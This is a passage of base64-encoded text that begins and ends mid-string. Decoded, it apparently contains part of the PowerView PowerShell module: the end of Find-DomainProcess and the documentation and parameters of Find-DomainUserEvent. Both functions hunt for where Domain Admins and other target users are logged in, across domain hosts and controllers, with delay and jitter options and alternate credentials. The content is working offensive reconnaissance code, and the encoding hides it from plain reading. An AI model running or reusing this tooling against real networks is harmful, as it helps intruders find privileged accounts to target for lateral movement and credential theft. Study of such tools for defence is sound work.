gKz0gJFQuU3BsaXQoJywnKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkVGFyZ2V0UHJvY2Vzc05hbWUgLWlzbm90IFtTeXN0ZW0uQXJyYXldKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0UHJvY2Vzc05hbWUgPSBbU3RyaW5nW11dIEAoJFRhcmdldFByb2Nlc3NOYW1lKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyTERBUEZpbHRlciddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyQWxsb3dEZWxlZ2F0aW9uJ10pIHsKICAgICAgICAgICAgJFRhcmdldFVzZXJzID0gR2V0LURvbWFpblVzZXIgQFVzZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IHNhbWFjY291bnRuYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAkR3JvdXBTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnSWRlbnRpdHknID0gJFVzZXJHcm91cElkZW50aXR5CiAgICAgICAgICAgICAgICAnUmVjdXJzZScgPSAkVHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJEb21haW4nXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkVXNlckRvbWFpbiB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hTY29wZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydUb21ic3RvbmUnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CiAgICAgICAgICAgICRHcm91cFNlYXJjaGVyQXJndW1lbnRzCiAgICAgICAgICAgICRUYXJnZXRVc2VycyA9IEdldC1Eb21haW5Hcm91cE1lbWJlciBAR3JvdXBTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IE1lbWJlck5hbWUKICAgICAgICB9CgogICAgICAgICMgdGhlIGhvc3QgZW51bWVyYXRpb24gYmxvY2sgd2UncmUgdXNpbmcgdG8gZW51bWVyYXRlIGFsbCBzZXJ2ZXJzCiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIFBhcmFtKCRDb21wdXRlck5hbWUsICRQcm9jZXNzTmFtZSwgJFRhcmdldFVzZXJzLCAkQ3JlZGVudGlhbCkKCiAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICAgICAkVXAgPSBUZXN0LUNvbm5lY3Rpb24gLUNvdW50IDEgLVF1aWV0IC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICBpZiAoJFVwKSB7CiAgICAgICAgICAgICAgICAgICAgIyB0cnkgdG8gZW51bWVyYXRlIGFsbCBhY3RpdmUgcHJvY2Vzc2VzIG9uIHRoZSByZW1vdGUgaG9zdAogICAgICAgICAgICAgICAgICAgICMgYW5kIHNlYXJjaCBmb3IgYSBzcGVjaWZpYyBwcm9jZXNzIG5hbWUKICAgICAgICAgICAgICAgICAgICBpZiAoJENyZWRlbnRpYWwpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3NlcyA9IEdldC1XTUlQcm9jZXNzIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2Vzc2VzID0gR2V0LVdNSVByb2Nlc3MgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgRm9yRWFjaCAoJFByb2Nlc3MgaW4gJFByb2Nlc3NlcykgewogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHdlJ3JlIGh1bnRpbmcgZm9yIGEgcHJvY2VzcyBuYW1lIG9yIGNvbW1hLXNlcGFyYXRlZCBuYW1lcwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFByb2Nlc3NOYW1lKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJFByb2Nlc3NOYW1lIC1Db250YWlucyAkUHJvY2Vzcy5Qcm9jZXNzTmFtZSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZXNzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGUgc2Vzc2lvbiB1c2VyIGlzIGluIHRoZSB0YXJnZXQgbGlzdCwgZGlzcGxheSBzb21lIG91dHB1dAogICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRUYXJnZXRVc2VycyAtQ29udGFpbnMgJFByb2Nlc3MuVXNlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFByb2Nlc3MKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAjIG9ubHkgaWdub3JlIHRocmVhZGluZyBpZiAtRGVsYXkgaXMgcGFzc2VkCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRGVsYXknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydTdG9wT25TdWNjZXNzJ10pIHsKCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIFRvdGFsIG51bWJlciBvZiBob3N0czogJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gRGVsYXk6ICREZWxheSwgSml0dGVyOiAkSml0dGVyIgogICAgICAgICAgICAkQ291bnRlciA9IDAKICAgICAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRUYXJnZXRDb21wdXRlcnMpIHsKICAgICAgICAgICAgICAgICRDb3VudGVyID0gJENvdW50ZXIgKyAxCgogICAgICAgICAgICAgICAgIyBzbGVlcCBmb3Igb3VyIHNlbWktcmFuZG9taXplZCBpbnRlcnZhbAogICAgICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQoKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIEVudW1lcmF0aW5nIHNlcnZlciAkVGFyZ2V0Q29tcHV0ZXIgKCRDb3VudGVyIG9mICQoJFRhcmdldENvbXB1dGVycy5jb3VudCkpIgogICAgICAgICAgICAgICAgJFJlc3VsdCA9IEludm9rZS1Db21tYW5kIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtQXJndW1lbnRMaXN0ICRUYXJnZXRDb21wdXRlciwgJFRhcmdldFByb2Nlc3NOYW1lLCAkVGFyZ2V0VXNlcnMsICRDcmVkZW50aWFsCiAgICAgICAgICAgICAgICAkUmVzdWx0CgogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWFuZCAkU3RvcE9uU3VjY2VzcykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIFRhcmdldCB1c2VyIGZvdW5kLCByZXR1cm5pbmcgZWFybHkiCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLURvbWFpblByb2Nlc3NdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdQcm9jZXNzTmFtZScgPSAkVGFyZ2V0UHJvY2Vzc05hbWUKICAgICAgICAgICAgICAgICdUYXJnZXRVc2VycycgPSAkVGFyZ2V0VXNlcnMKICAgICAgICAgICAgICAgICdDcmVkZW50aWFsJyA9ICRDcmVkZW50aWFsCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhyZWFkaW5nLCBraWNrIG9mZiB0aGUgc2NyaXB0IGJsb2NrIHdpdGggTmV3LVRocmVhZGVkRnVuY3Rpb24gdXNpbmcgdGhlICRIb3N0RW51bUJsb2NrICsgcGFyYW1zCiAgICAgICAgICAgIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVycyAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLVNjcmlwdFBhcmFtZXRlcnMgJFNjcmlwdFBhcmFtcyAtVGhyZWFkcyAkVGhyZWFkcwogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEZpbmQtRG9tYWluVXNlckV2ZW50IHsKPCMKLlNZTk9QU0lTCgpGaW5kcyBsb2dvbiBldmVudHMgb24gdGhlIGN1cnJlbnQgKG9yIHJlbW90ZSBkb21haW4pIGZvciB0aGUgc3BlY2lmaWVkIHVzZXJzLgoKQXV0aG9yOiBMZWUgQ2hyaXN0ZW5zZW4gKEB0aWZraW5fKSwgSnVzdGluIFdhcm5lciAoQHNpeGR1YiksIFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Vc2VyLCBHZXQtRG9tYWluR3JvdXBNZW1iZXIsIEdldC1Eb21haW5Db250cm9sbGVyLCBHZXQtRG9tYWluVXNlckV2ZW50LCBOZXctVGhyZWFkZWRGdW5jdGlvbiAgCgouREVTQ1JJUFRJT04KCkVudW1lcmF0ZXMgYWxsIGRvbWFpbiBjb250cm9sbGVycyBmcm9tIHRoZSBzcGVjaWZpZWQgLURvbWFpbgooZGVmYXVsdCBvZiB0aGUgbG9jYWwgZG9tYWluKSB1c2luZyBHZXQtRG9tYWluQ29udHJvbGxlciwgZW51bWVyYXRlcwp0aGUgbG9nb24gZXZlbnRzIGZvciBlYWNoIHVzaW5nIEdldC1Eb21haW5Vc2VyRXZlbnQsIGFuZCBmaWx0ZXJzCnRoZSByZXN1bHRzIGJhc2VkIG9uIHRoZSB0YXJnZXRpbmcgY3JpdGVyaWEuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGV4cGxpY2l0IGNvbXB1dGVyIG5hbWUgdG8gcmV0cmlldmUgZXZlbnRzIGZyb20uCgouUEFSQU1FVEVSIERvbWFpbgoKU3BlY2lmaWVzIGEgZG9tYWluIHRvIHF1ZXJ5IGZvciBkb21haW4gY29udHJvbGxlcnMgdG8gZW51bWVyYXRlLgpEZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIEZpbHRlcgoKQSBoYXNodGFibGUgb2YgUG93ZXJWaWV3LkxvZ29uRXZlbnQgcHJvcGVydGllcyB0byBmaWx0ZXIgZm9yLgpUaGUgJ29wfG9wZXJhdG9yfG9wZXJhdGlvbicgY2xhdXNlIGNhbiBoYXZlICcmJywgJ3wnLCAnYW5kJywgb3IgJ29yJywKYW5kIGlzICdvcicgYnkgZGVmYXVsdCwgbWVhbmluZyBhdCBsZWFzdCBvbmUgY2xhdXNlIG1hdGNoZXMgaW5zdGVhZCBvZiBhbGwuClNlZSB0aGUgZXhhcGxlcyBmb3IgdXNhZ2UuCgouUEFSQU1FVEVSIFN0YXJ0VGltZQoKVGhlIFtEYXRlVGltZV0gb2JqZWN0IHJlcHJlc2VudGluZyB0aGUgc3RhcnQgb2Ygd2hlbiB0byBjb2xsZWN0IGV2ZW50cy4KRGVmYXVsdCBvZiBbRGF0ZVRpbWVdOjpOb3cuQWRkRGF5cygtMSkuCgouUEFSQU1FVEVSIEVuZFRpbWUKClRoZSBbRGF0ZVRpbWVdIG9iamVjdCByZXByZXNlbnRpbmcgdGhlIGVuZCBvZiB3aGVuIHRvIGNvbGxlY3QgZXZlbnRzLgpEZWZhdWx0IG9mIFtEYXRlVGltZV06Ok5vdy4KCi5QQVJBTUVURVIgTWF4RXZlbnRzCgpUaGUgbWF4aW11bSBudW1iZXIgb2YgZXZlbnRzIChwZXIgaG9zdCkgdG8gcmV0cmlldmUuIERlZmF1bHQgb2YgNTAwMC4KCi5QQVJBTUVURVIgVXNlcklkZW50aXR5CgpTcGVjaWZpZXMgb25lIG9yIG1vcmUgdXNlciBpZGVudGl0aWVzIHRvIHNlYXJjaCBmb3IuCgouUEFSQU1FVEVSIFVzZXJEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHF1ZXJ5IGZvciB1c2VycyB0byBzZWFyY2ggZm9yLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIFVzZXJMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIHNlYXJjaCBmb3IgdGFyZ2V0IHVzZXJzLgoKLlBBUkFNRVRFUiBVc2VyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgdGFyZ2V0IHVzZXJzLgplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFVzZXJHcm91cElkZW50aXR5CgpTcGVjaWZpZXMgYSBncm91cCBpZGVudGl0eSB0byBxdWVyeSBmb3IgdGFyZ2V0IHVzZXJzLCBkZWZhdWx0cyB0byAnRG9tYWluIEFkbWlucy4KSWYgYW55IG90aGVyIHVzZXIgc3BlY2lmaWNhdGlvbnMgYXJlIHNldCwgdGhlbiBVc2VyR3JvdXBJZGVudGl0eSBpcyBpZ25vcmVkLgoKLlBBUkFNRVRFUiBVc2VyQWRtaW5Db3VudAoKU3dpdGNoLiBTZWFyY2ggZm9yIHVzZXJzIHVzZXJzIHdpdGggJyhhZG1pbkNvdW50PTEpJyAobWVhbmluZyBhcmUvd2VyZSBwcml2aWxlZ2VkKS4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIgZm9yIGNvbXB1dGVycywgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGNvbXB1dGVyKHMpLgoKLlBBUkFNRVRFUiBTdG9wT25TdWNjZXNzCgpTd2l0Y2guIFN0b3AgaHVudGluZyBhZnRlciBmaW5kaW5nIGFmdGVyIGZpbmRpbmcgYSB0YXJnZXQgdXNlci4KCi5QQVJBTUVURVIgRGVsYXkKClNwZWNpZmllcyB0aGUgZGVsYXkgKGluIHNlY29uZHMpIGJldHdlZW4gZW51bWVyYXRpbmcgaG9zdHMsIGRlZmF1bHRzIHRvIDAuCgouUEFSQU1FVEVSIEppdHRlcgoKU3BlY2lmaWVzIHRoZSBqaXR0ZXIgKDAtMS4wKSB0byBhcHBseSB0byBhbnkgc3BlY2lmaWVkIC1EZWxheSwgZGVmYXVsdHMgdG8gKy8tIDAuMwoKLlBBUkFNRVRFUiBUaHJlYWRzCgpUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGZvciB1c2VyIHNlYXJjaGluZywgZGVmYXVsdHMgdG8gMjAuCgouRVhBTVBMRQoKRmluZC1Eb21haW5Vc2VyRXZlbnQKClNlYXJjaCBmb3IgYW55IHVzZXIgZXZlbnRzIG1hdGNoaW5nIGRvbWFpbiBhZG1pbnMgb24gZXZlcnkgREMgaW4gdGhlIGN1cnJlbnQgZG9tYWluLgoKLkVYQU1QTEUKCiRjcmVkID0gR2V0LUNyZWRlbnRpYWwgZGV2XGFkbWluaXN0cmF0b3IKRmluZC1Eb21haW5Vc2VyRXZlbnQgLUNvbXB1dGVyTmFtZSAnc2Vjb25kYXJ5LmRldi50ZXN0bGFiLmxvY2FsJyAtVXNlcklkZW50aXR5ICdqb2huJwoKU2VhcmNoIGZvciBhbnkgdXNlciBldmVudHMgbWF0Y2hpbmcgdGhlIHVzZXIgJ2pvaG4nIG9uIHRoZSAnc2Vjb25kYXJ5LmRldi50ZXN0bGFiLmxvY2FsJwpkb21haW4gY29udHJvbGxlciB1c2luZyB0aGUgYWx0ZXJuYXRlIGNyZWRlbnRpYWwKCi5FWEFNUExFCgoncHJpbWFyeS50ZXN0bGFiLmxvY2FsIHwgRmluZC1Eb21haW5Vc2VyRXZlbnQgLUZpbHRlciBAeydJcEFkZHJlc3MnPScxOTIuMTY4LjUyLjIwMHwxOTIuMTY4LjUyLjIwMSd9CgpGaW5kIHVzZXIgZXZlbnRzIG9uIHRoZSBwcmltYXJ5LnRlc3RsYWIubG9jYWwgc3lzdGVtIHdoZXJlIHRoZSBldmVudCBtYXRjaGVzCnRoZSBJUEFkZHJlc3MgJzE5Mi4xNjguNTIuMjAwJyBvciAnMTkyLjE2OC41Mi4yMDEnLgoKLkVYQU1QTEUKCiRjcmVkID0gR2V0LUNyZWRlbnRpYWwgdGVzdGxhYlxhZG1pbmlzdHJhdG9yCkZpbmQtRG9tYWluVXNlckV2ZW50IC1EZWxheSAxIC1GaWx0ZXIgQHsnTG9nb25HdWlkJz0nYjg0NThhYTktYjM2ZS1lYWExLTk2ZTAtNDU1MTAwMGZkYjE5JzsgJ1RhcmdldExvZ29uSWQnID0gJzEwMjM4MTI4JzsgJ29wJz0nJid9CgpGaW5kIHVzZXIgZXZlbnRzIG1hdGhpbmcgdGhlIHNwZWNpZmllZCBHVUlEIEFORCB0aGUgc3BlY2lmaWVkIFRhcmdldExvZ29uSWQsIHNlYXJjaGluZwp0aHJvdWdoIGV2ZXJ5IGRvbWFpbiBjb250cm9sbGVyIGluIHRoZSBjdXJyZW50IGRvbWFpbiwgZW51bWVyYXRpbmcgZWFjaCBEQyBpbiBzZXJpYWwKaW5zdGVhZCBvZiBpbiBhIHRocmVhZGVkIG1hbm5lciwgdXNpbmcgdGhlIGFsdGVybmF0ZSBjcmVkZW50aWFsLgoKLk9VVFBVVFMKClBvd2VyVmlldy5Mb2dvbkV2ZW50CgpQb3dlclZpZXcuRXhwbGljaXRDcmVkZW50aWFsTG9nb24KCi5MSU5LCgpodHRwOi8vd3d3LnNpeGR1Yi5uZXQvMjAxNC8xMS8wNy9vZmZlbnNpdmUtZXZlbnQtcGFyc2luZy1icmluZ2luZy1ob21lLXRyb3BoaWVzLwojPgoKICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1Nob3VsZFByb2Nlc3MnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VEZWNsYXJlZFZhcnNNb3JlVGhhbkFzc2lnbm1lbnRzJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTVXNlUFNDcmVkZW50aWFsVHlwZScsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU0F2b2lkVXNpbmdQbGFpblRleHRGb3JQYXNzd29yZCcsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9nb25FdmVudCcpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5FeHBsaWNpdENyZWRlbnRpYWxMb2dvbicpXQogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnRG9tYWluJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAnQ29tcHV0ZXJOYW1lJywgUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnZG5zaG9zdG5hbWUnLCAnSG9zdE5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdEb21haW4nKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRGaWx0ZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkU3RhcnRUaW1lID0gW0RhdGVUaW1lXTo6Tm93LkFkZERheXMoLTEpLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbRGF0ZVRpbWVdCiAgICAgICAgJEVuZFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3csCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJE1heEV2ZW50cyA9IDUwMDAsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VySWRlbnRpdHksCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlckRvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0dyb3VwTmFtZScsICdHcm91cCcpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkVXNlckdyb3VwSWRlbnRpdHkgPSAnRG9tYWluIEFkbWlucycsCgogICAgICAgIFtBbGlhcygnQWRtaW5Db3VudCcpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFVzZXJBZG1pbkNvdW50LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja0FjY2VzcywKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICREZWxheSA9IDAsCgogICAgICAgIFtWYWx